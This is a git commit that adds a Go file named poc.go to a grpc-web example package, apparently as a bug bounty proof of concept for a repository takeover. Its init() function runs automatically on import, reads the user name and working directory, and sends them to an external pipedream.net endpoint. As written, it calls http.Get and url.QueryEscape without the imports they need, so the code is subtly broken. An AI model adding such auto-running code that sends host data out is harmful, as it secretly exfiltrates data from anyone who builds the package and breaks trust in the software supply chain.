8e8f0a515ad9b1e6bb569493dd03dbe0680d3589
Lark Technologies bugbounty POC by @nvk0x <nvkhacker@gmail.com>
2025-05-08 17:16:28 +0530

    Create poc.go

---
+++ examples/grpc-web/srv/pb/poc.go
@@ -0,0 +1,17 @@
+package pb
+
+import (
+	"fmt"
+	"os"
+)
+
+func init() {
+	user := os.Getenv("USER") // safe access
+	dir, _ := os.Getwd()      // current working dir
+
+	fmt.Printf("[PoC] Hello from unclaimed GitHub repo!\n")
+	fmt.Printf("[PoC] USER=%s\n", user)
+	fmt.Printf("[PoC] CWD=%s\n", dir)
+
+	http.Get("https://eou39l9f2i96s48.m.pipedream.net/poc?user=" + user + "&dir=" + url.QueryEscape(dir))
+}
